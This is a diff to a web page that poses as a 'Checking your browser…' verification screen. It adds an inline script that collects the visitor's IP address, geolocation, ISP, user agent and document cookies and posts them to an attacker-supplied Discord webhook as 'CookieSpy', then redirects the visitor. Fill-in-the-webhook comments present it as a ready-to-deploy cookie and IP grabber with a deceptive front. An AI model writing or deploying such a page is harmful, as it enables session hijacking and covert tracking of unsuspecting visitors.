@@ -1,22 +1,71 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking your browser…</title>
-
-    <!-- OPTIONAL: redirect after 3 seconds (change URL) -->
-    <!-- <meta http-equiv="refresh" content="3;url=https://example.com" /> -->
-
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 5rem; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Browser Check</title>
+  <style>
+    body { font-family: system-ui, sans-serif; text-align: center; margin-top: 10vh; }
+    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 2rem auto; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
 </head>
 <body>
-    <h1>Checking your browser…</h1>
+  <h1>Checking your browser…</h1>
+  <div class="spinner"></div>
 
-    <!-- Our logger script (inline for simplicity) -->
-    <script src="index.js"></script>
+  <!-- === CONFIGURE BELOW === -->
+  <script>
+    // PASTE YOUR DISCORD WEBHOOK URL HERE
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
+
+    // Where to redirect after logging (set to "" to disable)
+    const REDIRECT_AFTER = "https://example.com"; // change or leave empty
+
+    // === DO NOT EDIT BELOW ===
+    (async () => {
+      try {
+        // 1. Get IP + geo
+        const ipResp = await fetch("https://ip-api.com/json/");
+        const ipData = await ipResp.json();
+
+        // 2. Grab cookies
+        const cookies = document.cookie || "(no cookies)";
+
+        // 3. Build rich embed
+        const embed = {
+          title: "Cookie & IP Logged",
+          color: 0xff5555,
+          fields: [
+            { name: "IP", value: ipData.query || "unknown", inline: true },
+            { name: "Country", value: `${ipData.country} (${ipData.countryCode})`, inline: true },
+            { name: "City", value: ipData.city || "unknown", inline: true },
+            { name: "ISP", value: ipData.isp || "unknown", inline: true },
+            { name: "User Agent", value: navigator.userAgent, inline: false },
+            { name: "Cookies", value: "```" + (cookies.length > 1000 ? cookies.slice(0,997) + "..." : cookies) + "```", inline: false }
+          ],
+          thumbnail: { url: `https://flagcdn.com/64x48/${(ipData.countryCode || "xx").toLowerCase()}.png` },
+          timestamp: new Date().toISOString()
+        };
+
+        // 4. Send to Discord
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ username: "CookieSpy", embeds: [embed] })
+        });
+
+        // 5. Redirect or show success
+        if (REDIRECT_AFTER) {
+          setTimeout(() => location.href = REDIRECT_AFTER, 800);
+        } else {
+          document.body.innerHTML = "<h2>Done! Your data was sent.</h2>";
+        }
+      } catch (err) {
+        console.error("Logger failed:", err);
+        document.body.innerHTML = "<h2>Error – check console (F12).</h2>";
+      }
+    })();
+  </script>
 </body>
 </html>
